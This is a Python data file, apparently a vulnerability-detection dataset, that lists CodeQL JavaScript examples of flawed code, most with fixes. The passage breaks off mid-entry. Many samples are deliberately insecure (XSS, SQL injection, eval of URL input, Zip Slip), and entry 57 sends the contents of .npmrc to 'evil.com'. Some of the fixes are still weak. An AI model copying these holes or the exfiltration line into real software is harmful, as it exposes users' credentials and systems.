simple = [
    {
        "id": 1,
        "name": 'Access to let-bound variable in temporal dead zone',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-variable-use-in-temporal-dead-zone/',
        "code": """function f() {
    x = 23;
    let x;
}""",
        "fix": """function f() {
    let x;
    x = 23;
}"""
    },
    {
        "id": 2,
        "name": 'Arbitrary file access during archive extraction (”Zip Slip”)',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-zipslip/',
        "code": """const fs = require('fs');
const unzip = require('unzip');

fs.createReadStream('archive.zip')
  .pipe(unzip.Parse())
  .on('entry', entry => {
    const fileName = entry.path;
    entry.pipe(fs.createWriteStream(fileName));
  });""",
        "fix": """const fs = require('fs');
const unzip = require('unzip');

fs.createReadStream('archive.zip')
  .pipe(unzip.Parse())
  .on('entry', entry => {
    const fileName = entry.path;
    // GOOD: ensures the path is safe to write to.
    if (fileName.indexOf('..') == -1) {
      entry.pipe(fs.createWriteStream(fileName));
    }
    else {
      console.log('skipping bad path', fileName);
    }
  });"""
    },
    {
        "id": 3,
        "name": 'Arguments redefined',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-arguments-redefinition/',
        "code": """function f(x, arguments) {
	if (x === arguments[0])
		return 23;
	return 42;
}"""
    },
    {
        "id": 4,
        "name": 'Arrow method on Vue instance',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-vue-arrow-method-on-vue-instance/',
        "code": """new Vue({
  data: {
    myProperty: 42
  },
  created: () => {
    console.log('myProperty is: ' + this.myProperty);
  }
});
});"""
    },
    {
        "id": 5,
        "name": 'Assignment to constant',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-assignment-to-constant/',
        "code": """const loc = null;
if (dist < 10)
    loc = "here";
else
    loc = "there";"""
    },
    {
        "id": 6,
        "name": 'Assignment to exports variable',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-node-assignment-to-exports-variable/',
        "code": """// point.js
function Point(x, y) {
	this.x = x;
	this.y = y;
}

Point.prototype.distance = function() {
	return Math.sqrt(this.x*this.x+this.y*this.y);
};

exports = Point;

// client.js
var Point = require('./point');

var pyth = new Point(3, 4);
console.log(pyth.distance());""",
        "fix": """// point.js
function Point(x, y) {
	this.x = x;
	this.y = y;
}

Point.prototype.distance = function() {
	return Math.sqrt(this.x*this.x+this.y*this.y);
};

module.exports = Point;

// client.js
var Point = require('./point');

var pyth = new Point(3, 4);
console.log(pyth.distance());"""
    },
    {
        "id": 7,
        "name": 'Assignment to property of primitive value',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-property-assignment-on-primitive/',
        "code": """for (var i=s.length; i%8; ++i)
  s[i] = ' ';""",
        "fix": """for (var i=s.length; i%8; ++i)
  s += ' ';"""
    },
    {
        "id": 9,
        "name": 'Back reference precedes capture group',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-regex-back-reference-before-group/',
        "code": """if (/(?:start|end)(\[*|\{*)abc\2:(.*)/.test(input))
	console.log("Found the pattern.");"""
    },
    {
        "id": 10,
        "name": 'Bad HTML filtering regexp',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-bad-tag-filter/',
        "code": """function filterScript(html) {
    var scriptRegex = /<script\b[^>]*>([\s\S]*?)<\/script>/gi;
    var match;
    while ((match = scriptRegex.exec(html)) !== null) {
        html = html.replace(match[0], match[1]);
    }
    return html;
}"""
    },
    {
        "id": 11,
        "name": 'CORS misconfiguration for credentials transfer',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-cors-misconfiguration-for-credentials/',
        "code": """var https = require('https'),
    url = require('url');

var server = https.createServer(function(){});

server.on('request', function(req, res) {
    let origin = url.parse(req.url, true).query.origin;
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", true);

    // ...
});""",
        "fix": """var https = require('https'),
    url = require('url');

var server = https.createServer(function(){});

server.on('request', function(req, res) {
    let origin = url.parse(req.url, true).query.origin,
        whitelist = {
            "https://example.com": true,
            "https://subdomain.example.com": true,
            "https://example.com:1337": true
        };

    if (origin in whitelist) {
        // GOOD: the origin is in the whitelist
        res.setHeader("Access-Control-Allow-Origin", origin);
        res.setHeader("Access-Control-Allow-Credentials", true);
    }

    // ...
});"""
    },
    {
        "id": 12,
        "name": 'Call to eval-like DOM function',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-eval-like-call/',
        "code": """setTimeout("notifyUser();", 1000);""",
        "fix": """setTimeout(notifyUser, 1000);"""
    },
    {
        "id": 13,
        "name": 'Case-sensitive middleware path',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-case-sensitive-middleware-path/',
        "code": """const app = require('express')();

app.use(/\/admin\/.*/, (req, res, next) => {
    if (!req.user.isAdmin) {
        res.status(401).send('Unauthorized');
    } else {
        next();
    }
});

app.get('/admin/users/:id', (req, res) => {
    res.send(app.database.users[req.params.id]);
});""",
        "fix": """const app = require('express')();

app.use(/\/admin\/.*/i, (req, res, next) => {
    if (!req.user.isAdmin) {
        res.status(401).send('Unauthorized');
    } else {
        next();
    }
});

app.get('/admin/users/:id', (req, res) => {
    res.send(app.database.users[req.params.id]);
});"""
    },
    {
        "id": 14,
        "name": 'Clear text storage of sensitive information',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-clear-text-storage-of-sensitive-data/',
        "code": """var express = require('express');

var app = express();
app.get('/remember-password', function (req, res) {
  let pw = req.param("current_password");
  res.cookie("password", pw);
});""",
        "fix": """var express = require('express');
var crypto = require('crypto'),
    password = getPassword();

function encrypt(text){
  var cipher = crypto.createCipher('aes-256-ctr', password);
  return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
}

var app = express();
app.get('/remember-password', function (req, res) {
  let pw = req.param("current_password");
  // GOOD: Encoding the value before setting it.
  res.cookie("password", encrypt(pw));
});"""
    },
    {
        "id": 15,
        "name": 'Clear text transmission of sensitive cookie',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-clear-text-cookie/',
        "code": """const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});""",
        "fix": """const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});"""
    },
    {
        "id": 16,
        "name": 'Clear-text logging of sensitive information',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-clear-text-logging/',
        "code": """
console.info(`[INFO] Environment: ${process.env}`);""",
        "fix": """let not_sensitive_data = { a: 1, b : 2} 
// GOOD: it is fine to log data that is not sensitive
console.info(`[INFO] Some object contains: ${not_sensitive_data}`);"""
    },
    {
        "id": 17,
        "name": 'Client-side URL redirect',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-client-side-unvalidated-url-redirection/',
        "code": """window.location = /.*redirect=([^&]*).*/.exec(document.location.href)[1];"""
    },
    {
        "id": 18,
        "name": 'Client-side cross-site scripting',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-xss/',
        "code": """function setLanguageOptions() {
    var href = document.location.href,
        deflt = href.substring(href.indexOf("default=")+8);
    document.write("<OPTION value=1>"+deflt+"</OPTION>");
    document.write("<OPTION value=2>English</OPTION>");
}"""
    },
    {
        "id": 19,
        "name": 'Client-side request forgery',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-client-side-request-forgery/',
        "code": """async function loadMessage() {
    const query = new URLSearchParams(location.search);
    const url = '/api/messages/' + query.get('message_id');
    const data = await (await fetch(url)).json();
    document.getElementById('message').innerHTML = data.html;
}""",
        "fix": """async function loadMessage() {
    const query = new URLSearchParams(location.search);
    const url = '/api/messages/' + Number(query.get('message_id'));
    const data = await (await fetch(url)).json();
    document.getElementById('message').innerHTML = data.html;
}"""
    },
    {
        "id": 20,
        "name": 'Code injection',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-code-injection/',
        "code": """eval(document.location.href.substring(document.location.href.indexOf("default=")+8))"""
    },
    {
        "id": 21,
        "name": 'Comparison between inconvertible types',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-comparison-between-incompatible-types/',
        "code": """if (typeof window !== undefined)
	console.log("Running in a browser.");""",
        "fix": """if (typeof window !== "undefined")
	console.log("Running in a browser.");"""
    },
    {
        "id": 22,
        "name": 'Comparison with NaN',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-comparison-with-nan/',
        "code": """x === NaN""",
        "fix": """isNaN(x)"""
    },
    {
        "id": 23,
        "name": 'Conditional comments',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-conditional-comment/',
        "code": """/*@cc_on
  @if (@_jscript_version >= 6)
    console.log("You're running a new version of IE.");
  @else
    console.log("You're running an old version of IE.");
  @end
  @*/"""
    },
    {
        "id": 24,
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-function-declaration-conflict/',
        "correct": False,
        "issues": [],
        "name": 'Conflicting function declarations',
        "code": """function getConverter(dir) {
	if (dir === 'c2f') {
		function converter(c) {
			return c * 9/5 + 32;
		}
	} else {
		function converter(f) {
			return (f - 32) * 5/9;
		}
	}
	return converter;
}""",
        "fix": """function getConverter(dir) {
	var converter;
	if (dir === 'c2f') {
		converter = function (c) {
			return c * 9/5 + 32;
		};
	} else {
		converter = function (f) {
			return (f - 32) * 5/9;
		};
	}
	return converter;
}"""
    },
    {
        "id": 25,
        "name": 'Conflicting variable initialization',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-variable-initialization-conflict/',
        "code": """for (var iter in Iterator(aExtraHeaders)) {
    var key = iter[0], key = iter[1];
    xhr.setRequestHeader(key, value);
}""",
        "fix": """for (var iter in Iterator(aExtraHeaders)) {
    var key = iter[0], value = iter[1];
    xhr.setRequestHeader(key, value);
}"""
    },
    {
        "id": 26,
        "name": 'Creating biased random numbers from a cryptographically secure source',
        "correct": False,
        "issues": [],
        "link": 'https://codeql.github.com/codeql-query-help/javascript/js-biased-cryptographic-random/',
        "code": """const crypto = require('crypto');

const digits = [];
for (let i = 0; i < 10; i++) {
    digits.push(crypto.randomBytes(1)[0] % 10);
}""",
        "fix": """const crypto = require('crypto');

const digits = [];
while (digits.length < 10) {
    const byte = crypto.randomBytes(1)[0];
    if (byte >= 250) {
        continue;
    }
    digits.push(byte % 10); // OK
}"""
    },
    {
        "id": 8,
        "name": "Cross-window communication with unrestricted target origin",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-cross-window-information-leak/",
        "code": """window.parent.postMessage(userName, '*');""",
        "fix": """window.parent.postMessage(userName, 'https://github.com');"""
    },
    {
        "id": 27,
        "name": "DOM text reinterpreted as HTML",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-xss-through-dom/",
        "code": """$("button").click(function () {
    var target = $(this).attr("data-target");
    $(target).hide();
});""",
        "fix": """$("button").click(function () {
    var target = $(this).attr("data-target");
	$.find(target).hide();
});"""
    },
    {
        "id": 28,
        "name": "Database query built from user-controlled sources",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-sql-injection/",
        "code": """const app = require("express")(),
      pg = require("pg"),
      pool = new pg.Pool(config);

app.get("search", function handler(req, res) {
  var query1 =
    "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
    req.params.category +
    "' ORDER BY PRICE";
  pool.query(query1, [], function(err, results) {
    // process results
  });
});""",
        "fix": """const app = require("express")(),
      pg = require("pg"),
      pool = new pg.Pool(config);

app.get("search", function handler(req, res) {
  // GOOD: use parameters
  var query2 =
    "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE";
  pool.query(query2, [req.params.category], function(err, results) {
    // process results
  });
});"""
    },
    {
        "id": 29,
        "name": "Default parameter references nested function",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-nested-function-reference-in-default-parameter/",
        "code": """function f(x, y = defaultVal(x)) {
    function defaultVal(x) {
        return x+19;
    }
    return x*y;
}""",
        "fix": """function defaultVal(x) {
    return x+19;
}

function f(x, y = defaultVal(x)) {
    return x*y;
}"""
    },
    {
        "id": 30,
        "name": "Deleting non-property",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-deletion-of-non-property/",
        "code": """var cache;

function init() {
	cache = {};
}

function done() {
	delete cache;
}

function get(k) {
	k = '$' + k;
	if (!cache.hasOwnProperty(k))
		cache[k] = compute(k);
	return cache[k];
}

function compute(k) {
	// compute value for k
	// ...
}""",
        "fix": """(function(global) {
	var cache;

	global.init = function init() {
		cache = {};
	};

	global.done = function done() {
	};

	global.get = function get(k) {
		k = '$' + k;
		if (!cache.hasOwnProperty(k))
			cache[k] = compute(k);
		return cache[k];
	}

	function compute(k) {
		// compute value for k
		// ...
	}
}(this));"""
    },
    {
        "id": 31,
        "name": "Dependency download using unencrypted communication channel",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-insecure-dependency/",
        "code": """{
  "name": "example-project",
  "dependencies": {
    "unencrypted": "http://example.org/foo/tarball/release/0.0.1",
    "lodash": "^4.0.0"
  }
}""",
        "fix": """{
  "name": "example-project",
  "dependencies": {
    "unencrypted": "https://example.org/foo/tarball/release/0.0.1",
    "lodash": "^4.0.0"
  }
}"""
    },
    {
        "id": 32,
        "name": "Dependency mismatch",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-dependency-injection-mismatch/",
        "code": """angular.module('myapp')
       .directive('mydirective', [ '$compile', function($compile, $http) {
           // ...
       }]);""",
        "fix": """angular.module('myapp')
       .directive('mydirective', [ '$compile', '$http', function($compile, $http) {
           // ...
       }]);"""
    },
    {
        "id": 33,
        "name": "Deserialization of user-controlled data",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unsafe-deserialization/",
        "code": """const app = require("express")(),
  jsyaml = require("js-yaml");

app.get("load", function(req, res) {
  let data = jsyaml.load(req.params.data);
  // ...
});""",
        "fix": """const app = require("express")(),
  jsyaml = require("js-yaml");

app.get("load", function(req, res) {
  let data = jsyaml.safeLoad(req.params.data);
  // ...
});"""
    },
    {
        "id": 34,
        "name": "Direct state mutation",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-react-direct-state-mutation/",
        "code": """class Clock extends React.Component {
  componentDidMount() {
    setInterval(() => this.tick(), 1000);
  }
  tick() {
    this.state.now = Date.now();
  }
}""",
        "fix": """class Clock extends React.Component {
  componentDidMount() {
    setInterval(() => this.tick(), 1000);
  }
  tick() {
    this.setState({ now: Date.now() });
  }
}"""
    },
    {
        "id": 35,
        "name": "Disabling Electron webSecurity",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-disabling-electron-websecurity/",
        "code": """const mainWindow = new BrowserWindow({
  webPreferences: {
    webSecurity: false
  }
})"""
    },
    {
        "id": 36,
        "name": "Disabling SCE",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-disabling-sce/",
        "code": """angular.module('app', [])
    .config(function($sceProvider) {
        $sceProvider.enabled(false);
    }).controller('controller', function($scope) {
        // ...
        $scope.html = '<ul><li>' + item.toString() + '</li></ul>';
    });""",
        "fix": """angular.module('app', [])
    .controller('controller', function($scope, $sce) {
        // ...
        // GOOD (but should use the templating system instead)
        $scope.html = $sce.trustAsHtml('<ul><li>' + item.toString() + '</li></ul>'); 
    });"""
    },
    {
        "id": 37,
        "name": "Disabling certificate validation",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-disabling-certificate-validation/",
        "code": """let https = require("https");

https.request(
  {
    hostname: "secure.my-online-bank.com",
    port: 443,
    method: "POST",
    path: "send-confidential-information",
    rejectUnauthorized: false
  },
  response => {
    // ... communicate with secure.my-online-bank.com
  }
);"""
    },
    {
        "id": 38,
        "name": "Double compilation",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-double-compilation/",
        "code": """angular.module('myapp')
       .directive('addToolTip', function($compile) {
  return {
    link: function(scope, element, attrs) {
      var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
      tooltip.on('mouseenter mouseleave', function() {
        scope.$apply('showToolTip = !showToolTip');
      });
      element.append(tooltip);
      $compile(element)(scope);
    }
  };
});""",
        "fix": """angular.module('myapp')
       .directive('addToolTip', function($compile) {
  return {
    link: function(scope, element, attrs) {
      var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
      tooltip.on('mouseenter mouseleave', function() {
        scope.$apply('showToolTip = !showToolTip');
      });
      element.append(tooltip);
      $compile(tooltip)(scope); // OK
    }
  };
});"""
    },
    {
        "id": 39,
        "name": "Double escaping or unescaping",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-double-escaping/",
        "code": """module.exports.encode = function(s) {
  return s.replace(/&/g, "&amp;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&apos;");
};

module.exports.decode = function(s) {
  return s.replace(/&amp;/g, "&")
          .replace(/&quot;/g, "\"")
          .replace(/&apos;/g, "'");
};""",
        "fix": """module.exports.encode = function(s) {
  return s.replace(/&/g, "&amp;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&apos;");
};

module.exports.decode = function(s) {
  return s.replace(/&quot;/g, "\"")
          .replace(/&apos;/g, "'")
          .replace(/&amp;/g, "&");
};"""
    },
    {
        "id": 40,
        "name": "Download of sensitive file through insecure connection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-insecure-download/",
        "code": """const fetch = require("node-fetch");
const cp = require("child_process");

fetch('http://mydownload.example.org/myscript.sh')
    .then(res => res.text())
    .then(script => cp.execSync(script));""",
        "fix": """const fetch = require("node-fetch");
const cp = require("child_process");

fetch('https://mydownload.example.org/myscript.sh')
    .then(res => res.text())
    .then(script => cp.execSync(script));"""
    },
    {
        "id": 41,
        "name": "Duplicate ‘if’ condition",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-duplicate-condition/",
        "code": """function controller(msg) {
	if (msg == 'start')
		start();
	else if (msg == 'start')
		stop();
	else
		throw new Error("Message not understood.");
}""",
        "fix": """function controller(msg) {
	if (msg == 'start')
		start();
	else if (msg == 'stop')
		stop();
	else
		throw new Error("Message not understood.");
}"""
    },
    {
        "id": 42,
        "name": "Duplicate HTML element attributes",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-duplicate-html-attribute/",
        "code": """<a href="https://semmle.com" href="https://semmle.com">Semmle</a>""",
        "fix": """<a href="https://semmle.com">Semmle</a>"""
    },
    {
        "id": 43,
        "name": "Duplicate character in character class",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-regex-duplicate-in-character-class/",
        "code": """if (/[password|pwd] =/.test(input))
	console.log("Found password!");"""
    },
    {
        "id": 44,
        "name": "Duplicate dependency",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-duplicate-dependency/",
        "code": """angular.module('myModule', [])
    .controller('MyController', ['$scope',
                                 '$cookies',
                                 '$cookies',
                                 function($scope, , $cookies1, $cookies2) {
        // ...
    });""",
        "fix": """angular.module('myModule', [])
    .controller('MyController', ['$scope',
                                 '$cookies',
                                 function($scope, $cookies) {
        // ...
    });"""
    },
    {
        "id": 45,
        "name": "Duplicate parameter names",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-duplicate-parameter-name/",
        "code": """function f(x, x) {
	return x+y;
}"""
    },
    {
        "id": 46,
        "name": "Duplicate property",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-duplicate-property/",
        "code": """$(".alert").css({
  backgroundColor: "orange",
  fontWeight: "bold",
  backgroundColor: "orange"
});""",
        "fix": """$(".alert").css({
  backgroundColor: "orange",
  fontWeight: "bold"
});"""
    },
    {
        "id": 47,
        "name": "Duplicate switch case",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-duplicate-switch-case/",
        "code": """function controller(msg) {
	switch (msg) {
	case 'start':
		start();
		break;
	case 'start':
		stop();
		break;
	default:
		throw new Error("Message not understood.");
	}
}""",
        "fix": """function controller(msg) {
	switch (msg) {
	case 'start':
		start();
		break;
	case 'stop':
		stop();
		break;
	default:
		throw new Error("Message not understood.");
	}
}"""
    },
    {
        "id": 48,
        "name": "Duplicate variable declaration",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-duplicate-variable-declaration/",
        "code": """var dom,
    contactDetails,
    phonesTemplate,
    emailsTemplate,
    dom;"""
    },
    {
        "id": 49,
        "name": "Empty character class",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-regex-empty-character-class/",
        "code": """if (!/[[{]\w+[]}]/.test(input))
	console.log("Malformed input.");"""
    },
    {
        "id": 51,
        "name": "Enabling Electron allowRunningInsecureContent",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-enabling-electron-insecure-content/",
        "code": """const mainWindow = new BrowserWindow({
  webPreferences: {
    allowRunningInsecureContent: true
  }
})"""
    },
    {
        "id": 52,
        "name": "Exception text reinterpreted as HTML",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-xss-through-exception/",
        "code": """function setLanguageOptions() {
    var href = document.location.href,
        deflt = href.substring(href.indexOf("default=")+8);

    try {
        var parsed = unknownParseFunction(deflt); 
    } catch(e) {
        document.write("Had an error: " + e + ".");
    }
}"""
    },
    {
        "id": 53,
        "name": "Exposure of private files",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-exposure-of-private-files/",
        "code": """var express = require('express');

var app = express();

app.use('/node_modules', express.static(path.resolve(__dirname, '../node_modules')));""",
        "fix": """var express = require('express');

var app = express();

app.use("jquery", express.static('./node_modules/jquery/dist'));
app.use("bootstrap", express.static('./node_modules/bootstrap/dist'));"""
    },
    {
        "id": 54,
        "name": "Expression has no effect",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-useless-expression/",
        "code": """function Graph(nodes, edges) {
  this.nodes = nodes;
  this.edges = edges;
  // cache minimum distance between pairs of nodes
  this.distance;
}""",
        "fix": """function Graph(nodes, edges) {
  this.nodes = nodes;
  this.edges = edges;
  // cache minimum distance between pairs of nodes
  this.distance = {};
}"""
    },
    {
        "id": 55,
        "name": "Expression injection in Actions",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/",
        "code": """on: issue_comment

jobs:
  echo-body:
    runs-on: ubuntu-latest
    steps:
    - run: |
        echo '${{ github.event.comment.body }}'""",
        "fix": """on: issue_comment

jobs:
  echo-body:
    runs-on: ubuntu-latest
    steps:
    - env:
        BODY: ${{ github.event.issue.body }}
      run: |
        echo "$BODY\""""
    },
    {
        "id": 56,
        "name": "Failure to abandon session",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-session-fixation/",
        "code": """const express = require('express');
const session = require('express-session');
var bodyParser = require('body-parser')
const app = express();
app.use(bodyParser.urlencoded({ extended: false }))
app.use(session({
    secret: 'keyboard cat'
}));

app.post('/login', function (req, res) {
    // Check that username password matches
    if (req.body.username === 'admin' && req.body.password === 'admin') {
        req.session.authenticated = true;
        res.redirect('/');
    } else {
        res.redirect('/login');
    }
});""",
        "fix": """const express = require('express');
const session = require('express-session');
var bodyParser = require('body-parser')
const app = express();
app.use(bodyParser.urlencoded({ extended: false }))
app.use(session({
    secret: 'keyboard cat'
}));

app.post('/login', function (req, res) {
    // Check that username password matches
    if (req.body.username === 'admin' && req.body.password === 'admin') {
        req.session.regenerate(function (err) {
            if (err) {
                res.send('Error');
            } else {
                req.session.authenticated = true;
                res.redirect('/');
            }
        });
    } else {
        res.redirect('/login');
    }
});"""
    },
    {
        "id": 57,
        "name": "File data in outbound network request",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-file-access-to-http/",
        "code": """var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8");
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { });"""
    },
    {
        "id": 58,
        "name": "Hard-coded credentials",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-hardcoded-credentials/",
        "code": """let base64 = require('base-64');

let url = 'http://example.org/auth';
let username = 'user';
let password = 'passwd';

let headers = new Headers();

headers.append('Content-Type', 'text/json');
headers.append('Authorization', 'Basic' + base64.encode(username + ":" + password));

fetch(url, {
          method:'GET',
          headers: headers
       })
.then(response => response.json())
.then(json => console.log(json))
.done();""",
        "fix": """let base64 = require('base-64');

let url = 'http://example.org/auth';
let username = process.env.USERNAME;
let password = process.env.PASSWORD;

let headers = new Headers();

headers.append('Content-Type', 'text/json');
headers.append('Authorization', 'Basic' + base64.encode(username + ":" + password));

fetch(url, {
        method:'GET',
        headers: headers
     })
.then(response => response.json())
.then(json => console.log(json))
.done();"""
    },
    {
        "id": 59,
        "name": "Hard-coded data interpreted as code",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-hardcoded-data-interpreted-as-code/",
        "code": """var r = require;

function e(r) {
  return Buffer.from(r, "hex").toString()
}

var n = r(e("2e2f746573742f64617461"));"""
    },
    {
        "id": 60,
        "name": "Host header poisoning in email generation",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-host-header-forgery-in-email-generation/",
        "code": """let nodemailer = require('nodemailer');
let express = require('express');
let backend = require('./backend');

let app = express();

let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

app.post('/resetpass', (req, res) => {
  let email = req.query.email;
  let transport = nodemailer.createTransport(config.smtp);
  let token = backend.getUserSecretResetToken(email);
  transport.sendMail({
    from: 'webmaster@example.com',
    to: email,
    subject: 'Forgot password',
    text: `Click to reset password: https://${req.host}/resettoken/${token}`,
  });
});""",
        "fix": """let nodemailer = require('nodemailer');
let express = require('express');
let backend = require('./backend');

let app = express();

let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

app.post('/resetpass', (req, res) => {
  let email = req.query.email;
  let transport = nodemailer.createTransport(config.smtp);
  let token = backend.getUserSecretResetToken(email);
  transport.sendMail({
    from: 'webmaster@example.com',
    to: email,
    subject: 'Forgot password',
    text: `Click to reset password: https://${config.hostname}/resettoken/${token}`,
  });
});"""
    },
    {
        "id": 61,
        "name": "Identical operands",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-redundant-operation/",
        "code": """function avg(x, y) {
	return (x + x)/2;
}""",
        "fix": """function avg(x, y) {
	return (x + y)/2;
}"""
    },
    {
        "id": 62,
        "name": "Ignoring result from pure array method",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-ignore-array-result/",
        "code": """var arr = [1,2,3];

function extend(others) {
	arr.concat(others);
}""",
        "fix": """var arr = [1,2,3];

function extend(others) {
	arr = arr.concat(others);
}"""
    },
    {
        "id": 63,
        "name": "Illegal invocation",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-illegal-invocation/",
        "code": """class Point {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }
}

let p = Point(23, 42);""",
        "fix": """class Point {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }
}

let p = new Point(23, 42);"""
    },
    {
        "id": 64,
        "name": "Implicit operand conversion",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-implicit-operand-conversion/",
        "code": """function invk(obj, member) {
    if (!member in obj)
        throw new Error("No such member: " + member);
    return obj[member]();
}""",
        "fix": """function invk(obj, member) {
    if (!(member in obj))
        throw new Error("No such member: " + member);
    return obj[member]();
}"""
    },
    {
        "id": 65,
        "name": "Improper code sanitization",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-bad-code-sanitization/",
        "code": """function createObjectWrite() {
    const assignment = `obj[${JSON.stringify(key)}]=42`;
    return `(function(){${assignment}})`
}""",
        "fix": """const charMap = {
    '<': '\\u003C',
    '>' : '\\u003E',
    '/': '\\u002F',
    '\\': '\\\\',
    '\b': '\\b',
    '\f': '\\f',
    '\n': '\\n',
    '\r': '\\r',
    '\t': '\\t',
    '\0': '\\0',
